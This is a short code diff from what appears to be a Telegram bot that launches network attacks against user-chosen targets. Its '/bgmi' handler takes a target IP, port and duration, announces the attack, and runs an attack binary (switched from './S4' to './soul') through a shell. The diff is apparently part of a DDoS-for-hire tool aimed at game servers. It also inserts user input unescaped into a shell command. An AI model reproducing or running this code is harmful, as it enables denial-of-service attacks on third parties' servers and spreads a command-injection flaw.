@@ -200,7 +200,7 @@ def handle_bgmi(message):
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./S4 {target} {port} {time} 110", "./S41 {target} {port} {time} 10"
+                    full_command = f"./soul {target} {port} {time} 10"
                     subprocess.run(full_command, shell=True)
                     response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🔥"
             except ValueError:
